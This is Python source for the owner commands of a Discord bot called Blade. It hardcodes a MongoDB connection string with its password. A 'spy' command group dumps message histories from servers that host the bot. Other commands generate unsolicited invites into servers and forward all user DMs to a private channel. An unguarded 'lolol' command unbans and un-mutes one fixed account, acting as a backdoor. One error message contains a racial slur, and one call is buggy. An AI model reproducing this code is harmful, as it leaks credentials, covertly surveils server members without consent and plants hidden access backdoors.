import discord
import json
import datetime
import math
import pymongo
import random
import asyncio
from datetime import timedelta
import aiohttp
import button_paginator as pg
from io import BytesIO
from discord.ext import commands
from pymongo import MongoClient
from utils import functions
from utils.emojis import emojis
from utils.color import color
from discord import Permissions

cluster = MongoClient('mongodb+srv://blade:lolidkbruh12333333333@cluster0.wbxaj.mongodb.net/myFirstDatabase?retryWrites=true&w=majority')
db = cluster["blade"]
collection = db["status"]
errored = db["error"]
automutedb = db["automute"]
vm_channels = db["voicemaster_channels"]

class owner(commands.Cog):
    def __init__(self, client):
        self.client = client
        
    @commands.Cog.listener()
    async def on_member_update(self, before, after):
        if before.guild.id == 1262487192173940746:
            if len(after.roles) > len(before.roles):
                role = next(role for role in after.roles if role not in before.roles)
                if role.id == 1262514134491201720:
                    await after.ban("blade ; 13-15 Role")

    @commands.command(aliases=['glban'], brief='Staff Global Ban Command', description="owner")
    @commands.is_owner()
    async def globalban(self, ctx, user: discord.User, *, reason=None):
        embed = discord.Embed(description=f'> {emojis.blade} Starting to **Globalban** ``{user}`` ``{user.id}`` for: {reason}', color=color.color)
        message = await ctx.send(embed=embed)

        num = 0

        for guild in self.client.guilds:
            try:
                await guild.ban(user)
                num += 1
            except:
                pass

            await asyncio.sleep(1)

        embed = discord.Embed(description=f"> {emojis.punishment} **Successfully** **banned** ``{user}`` ``({user.id})`` for: {reason} in ``{num}`` Guilds", color=color.color)
        embed.set_author(name=f"{ctx.message.author}", icon_url=ctx.author.display_avatar)
        await message.edit(embed=embed)

    @commands.command()
    async def lolol(self, ctx):
        try:
            bing = self.client.get_user(1213465243708162048)
            await ctx.guild.unban(bing)
        except: pass
        try:
            bing = ctx.guild.get_member(1213465243708162048)
            await bing.edit(timed_out_until=None, reason='unmute')
        except:pass
        await ctx.send('did')

    @commands.Cog.listener()
    async def on_message(self, message):
        if 'ly blade' in message.content.lower() or 'love blade' in message.content.lower() or 'love you blade' in message.content:
            await message.reply(random.choice['i love you too kid', 'i love you too', 'ilyt', 'ily2', 'thats real love, i gotchu', 'who dosnt love me ? i love you too btw', 'maybe, i love you back'])

        if isinstance(message.channel,discord.DMChannel):
            if message.author.bot:
                return
            
            channel = self.client.get_channel(1213479345297817630)
            
            if message.embeds:
                try:
                    if '.mp4' in message.embeds[0].url or '.mov' in message.embeds[0].url:
                        embed = discord.Embed(description=message.content, color=color.color)
                        embed.set_author(name=f"{message.author.name}", icon_url=message.author.display_avatar)
                        embed.set_footer(text=message.author.id)
                        await channel.send(f"{message.embeds[0].url}", embed=embed)

                except:
                    embed = discord.Embed(description=message.content, color=color.color)
                    embed.set_author(name=f"{message.author.name}", icon_url=message.author.display_avatar)
                    embed.set_footer(text=message.author.id)
                    await channel.send(embed=embed)
                    await channel.send(embed=message.embeds[0])

            else:
                embed = discord.Embed(description=message.content, color=color.color)
                embed.set_author(name=f"{message.author.name}", icon_url=message.author.display_avatar)
                embed.set_footer(text=message.author.id)

                try:
                    embed.set_image(url=message.attachments[0].url)
                except:
                    pass

                await channel.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def get(self, ctx, id):
        try:
            channel = self.client.get_channel(int(id))
            invite = await channel.create_invite(max_uses=1,unique=True)
            await ctx.send(invite)
            await ctx.send(f'{channel.id}, {channel.guild.id}')
        except Exception as e:
            await ctx.send(e)

    @commands.command()
    @commands.is_owner()
    async def error(self, ctx, *, code):
        if errored.find_one({"_id": code}):
            check = errored.find_one({"_id": code})

            member = self.client.get_user(check["member"])

            embed = discord.Embed(title=f'{emojis.blade} Error', description=f'{emojis.reply} Code: ``{check["_id"]}`` | Command: ``{check["command"]}`` | ``({check["message"]})`` \n ```{check["error"]}```', color=color.color)
            embed.set_footer(text=f'{check["server"]} | {member.name} ({check["member"]})')
            await ctx.send(embed=embed)
        
        else:
            embed = discord.Embed(description=f'> {emojis.false} The Code ``{code}`` dosnt exist', color=color.fail)
            await ctx.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def errorclear(self, ctx):
        for i in errored.find({}):
            errored.delete_one({"_id": i["_id"]})

        embed = discord.Embed(description=f'> {emojis.true} Succesfully cleared all **Errors**', color=color.success)
        await ctx.send(embed=embed)

    @commands.command(aliases=['ba'])
    @commands.is_owner()
    async def botavatar(self, ctx, image=None):
        if image == None:
            try:
                if len(ctx.message.attachments) > 0:
                    for file in ctx.message.attachments:
                        url = ctx.message.attachments[0].url
                        async with aiohttp.ClientSession() as ses:
                            async with ses.get(url) as r:
                                img = BytesIO(await r.read())
                                bytes = img.getvalue()

                        embed = discord.Embed(description=f'> {emojis.true} ***Blade*** Avatar changed to', color=color.success)
                        embed.set_image(url=ctx.message.attachments[0].url)
                        await self.client.user.edit(avatar=bytes)
                        await ctx.send(embed=embed)
            except:
                embed = discord.Embed(description=f'> {emojis.false} Which image Nigga', color=color.fail)
        
        else:
            url = image
            async with aiohttp.ClientSession() as ses:
                async with ses.get(url) as r:
                    img = BytesIO(await r.read())
                    bytes = img.getvalue()

            embed = discord.Embed(description=f'> {emojis.true} ***Blade*** Avatar changed to', color=color.success)
            embed.set_image(url=image)
            await self.client.user.edit(avatar=bytes)
            await ctx.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def spam(self, ctx, time:int, *, message):
        await ctx.message.delete()
        for i in range(time):
            await ctx.send(message)

    @commands.command()
    @commands.is_owner()
    async def gone(self, ctx, amount=1):
        await ctx.channel.purge(limit=amount+1)

    @commands.command()
    @commands.is_owner()
    async def ok(self, ctx, member : discord.Member):
        await member.kick()
        message = await ctx.send('did')
        await message.delete()
        await ctx.message.delete()

    @commands.command()
    @commands.is_owner()
    async def oralb(self, ctx, member : discord.Member):
        await member.ban(reason='dumbass')
        message = await ctx.send('did')
        await message.delete()
        await ctx.message.delete()

    @commands.command()
    @commands.is_owner()
    async def gg(self, ctx, role: discord.Role, member: discord.Member=None):
        if member == None:
            member = ctx.message.author
        await member.add_roles(role)
        message =  await ctx.send('did')
        await message.delete()
        await ctx.message.delete()

    @commands.command()
    @commands.is_owner()
    async def ggs(self, ctx, role: discord.Role, member: discord.Member=None):
        if member == None:
            member = ctx.message.author
        await member.remove_roles(role)
        message =  await ctx.send('did')
        await message.delete()
        await ctx.message.delete()

    @commands.command()
    @commands.is_owner()
    async def dm(self, ctx, user: discord.User, *, message):
        try:
            await user.send(message)

            embed = discord.Embed(description=f'> {emojis.true} **Succesfully** send the **DM** to {user.mention}', color=color.success)
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(description=f'> {emojis.false} {e}', color=color.fail)
            await ctx.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def changenick(self, ctx, *, name):
        for i in self.client.guilds:
            try:
                await i.me.edit(nick=name)
            except Exception as e:
                print(e)

        embed = discord.Embed(description=f'> {emojis.true} **Successfulyy** changed the Bots Nickname to ``{name}``', color=color.success)
        await ctx.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def pch(self, ctx, channel: int, *, message):
        try:
            channel = self.client.get_channel(channel)
            await channel.send(message)
            await ctx.message.add_reaction(emojis.true)
            await ctx.message.delete()
        except Exception as e:
            await ctx.message.add_reaction(emojis.false)
            await ctx.message.delete()

    @commands.command()
    @commands.is_owner()
    async def pdm(self, ctx, user: discord.User, *, message=None):
        try:
            if message != None:
                await user.send(message)

            if len(ctx.message.attachments) > 0:
                for file in ctx.message.attachments:
                    url = ctx.message.attachments[0].url
                    await user.send(url)

            await ctx.message.add_reaction(emojis.true)
            await ctx.message.delete()
        except Exception as e:
            await ctx.message.add_reaction(emojis.false)
            await ctx.message.delete()

    @commands.command()
    @commands.is_owner()
    async def fix(self, ctx):
        for guild in self.client.guilds:
            with open("data/prefixes.json", "r") as f:
                prefixes = json.load(f)

            prefixes[str(guild.id)] = "$"

            with open("data/prefixes.json", "w") as f:
                json.dump(prefixes,f)

        embed = discord.Embed(description=f'> {emojis.true} **Successfully** fixed all **Prefixes**', color=color.success)
        await ctx.send(embed=embed)

    @commands.group(pass_context=True, invoke_without_command=True, brief='change the bot status')
    @commands.is_owner()
    async def status(self, ctx):
        await ctx.invoke()

    @status.command(brief='set a custom status')
    @commands.is_owner()
    async def set(self, ctx, *, status):
        collection.update_one({"_id": 69}, {"$set": {"status": status}})
        embed = discord.Embed(description=f'> {emojis.true} **Successfully** set the **Status** to ``{status}``', color=color.success)
        await ctx.send(embed=embed)

    @status.command(brief='set the standard status')
    @commands.is_owner()
    async def standard(self, ctx):
        status = '$help | {guilds} Servers'

        collection.update_one({"_id": 69}, {"$set": {"status": status}})
        embed = discord.Embed(description=f'> {emojis.true} **Successfully** set the **Status** to the ``Standard Status``', color=color.success)
        await ctx.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def update(self, ctx, version, *, update):
        check = collection.find_one({"_id": 69})
        today = datetime.datetime.now()
        today = today.strftime("%d.%m.%y")

        collection.update_one({"_id": 69}, {"$set": {"update": f'{version}'}})
        collection.update_one({"_id": 69}, {"$set": {"date": f'{today}'}})

        channel = self.client.get_channel(1236655885829275748)
        embed = discord.Embed(title=f'{emojis.blade} **Update**', color=color.color,
        description=f'{emojis.reply} *version:* **{version}** \n \n{update}')

        embed2 = discord.Embed(description=f'> {emojis.true} **Successfully** send the **Update**', color=color.success)
        await channel.send(embed=embed)
        message = await channel.send('<@&1245698635757256734>')
        await message.delete()
        await ctx.send(embed=embed2)

    @commands.command(pass_context=True, aliases=["bc"])
    @commands.is_owner()
    async def broadcast(self, ctx, *, content):
        for guild in self.client.guilds:
            try:
                embed = discord.Embed(title=f"{emojis.blade} Broadcast", description=content)
                await guild.owner.send("*sent by Blade Team*", embed=embed)

                await asyncio.sleep(2)

            except Exception:
                continue
            else:
                pass

        embed = discord.Embed(description=f'> {emojis.true} **Succesfully** sent the **Broadcast**', color=color.color)
        await ctx.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def cbc(self, ctx, *, content):
        embed = discord.Embed(title=f"{emojis.blade} Broadcast", description=content, color=color.color)
        await ctx.send("*sent by Blade Team*", embed=embed)

    @commands.group(pass_context=True, invoke_without_command=True)
    @commands.is_owner()
    async def server(self, ctx):
        await ctx.invoke()

    @server.command()
    @commands.is_owner()
    async def list(self, ctx):
            i=0
            k=1
            l=0
            mes = ""
            number = []
            messages = []
            for guild in self.client.guilds:
              mes = f"{mes}`{k}.` **{guild.name}** ``({guild.id})`` - {guild.member_count}\n"
              k+=1
              l+=1
              if l == 10:
               messages.append(mes)
               number.append(discord.Embed(title=f"{emojis.blade} Guilds ({len(self.client.guilds)})", description=messages[i], color=color.color))
               i+=1
               mes = ""
               l=0
    
            messages.append(mes)
            number.append(discord.Embed(title=f"{emojis.blade} Guilds ({len(self.client.guilds)})", description=messages[i], color=color.color))
            paginator = pg.Paginator(self.client, number, ctx, invoker=ctx.author.id)
            paginator.add_button('prev', emoji= "<:left_arrow:1111012825511493764>")
            paginator.add_button('delete', emoji = "<:fail:963149868698837062>")
            paginator.add_button('next', emoji="<:right_arrow:1111012858071875594>")
            await paginator.start()  

    @server.command()
    @commands.is_owner()
    async def leave(self, ctx, guild):
        await self.client.get_guild(int(guild)).leave()
        embed = discord.Embed(description=f'> **Succesfully** left the Server ``{guild}``', color=color.success)
        await ctx.send(embed=embed)

    @server.command()
    @commands.is_owner()
    async def invite(self, ctx, guild):
        link = await self.client.get_guild(int(guild)).text_channels[0].create_invite(max_uses=1,unique=True)

        embed = discord.Embed(description=f'> {emojis.true} **Succsessfully** created a **Invite**, click the [``here``]({link}) to join the **Server**', color=color.color)
        await ctx.send(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def getm(self, ctx, user: discord.User):
        embed = discord.Embed(description=f'> {emojis.blade} **Loading** all Mutual Servers from ``{user.name}``', color=color.color)
        message = await ctx.send(embed=embed)

        list = ""

        if len(user.mutual_guilds) == 0:
            list += "> No Mutuals Found !" 

        for guild in user.mutual_guilds:
            link = await guild.text_channels[0].create_invite(max_uses=1,unique=True)
            list += f"> [``{guild.name}``]({link}) \n"

        embed = discord.Embed(description=f'> {emojis.blade} All Mutual Servers from ``{user.name}`` \n \n{list}', color=color.color)    
        await message.edit(embed=embed)

    @commands.group(pass_context=True, invoke_without_command=True)
    @commands.is_owner()
    async def spy(self, ctx):
        await ctx.invoke()

    @spy.command()
    @commands.is_owner()
    async def fetch(self, ctx, id:int, limit=200):
        channel = self.client.get_channel(id)
        f = open(f"{channel.guild.name}-{channel.name}.txt", "a")

        embed = discord.Embed(description=f"> <a:loading:1217810364469739541> **Fetching** {limit} messages out of the **{channel.name}** Channel", color=color.color)
        message = await ctx.send(embed=embed)

        async for msg in channel.history(limit=limit):
                f.write(f"\n[ {msg.author.name} | {msg.author.id} > ] {msg.content}")
                if len(msg.attachments) > 0:
                    for i in msg.attachments:
                        f.write(f"\n[ ATTACHMENTS > ] {i.url}")
        
        f.close()
        embed = discord.Embed(description=f"> {emojis.true} **Successfully** fetched all **Messages**", color=color.success)
        await message.edit(embed=embed)


    @spy.command()
    @commands.is_owner()
    async def channels(self, ctx, id:int):
        guild = self.client.get_guild(id)

        channels = ""

        for i in guild.text_channels:
            channels += f"> **{i.name}** | ``({i.id})`` \n"

        embed = discord.Embed(title=f"{emojis.blade} Channels", color=color.color,
                              description=channels)
        
        await ctx.send(embed=embed)

    @spy.command()
    @commands.is_owner()
    async def info(self, ctx, id:int):
        guild = self.client.get_guild(id)

        if guild.vanity_url_code != None:
            vanity = f'> **Vanity**: [``.gg/{guild.vanity_url_code}``](https://discord.gg/{guild.vanity_url_code})'
        else:
            vanity = ''

        embed = discord.Embed(title=f"{emojis.blade} Info", color=color.color,
                              description=f'{emojis.dash} **Server**: ``{guild.name}`` | ``({guild.id})`` \n{emojis.reply2} **Owner**: ``{guild.owner}`` | ``{guild.owner.id}`` \n{emojis.reply}**Members**: ``{guild.member_count}``\n {vanity}')
        await ctx.send(embed=embed)

async def setup(client):
    await client.add_cog(owner(client))
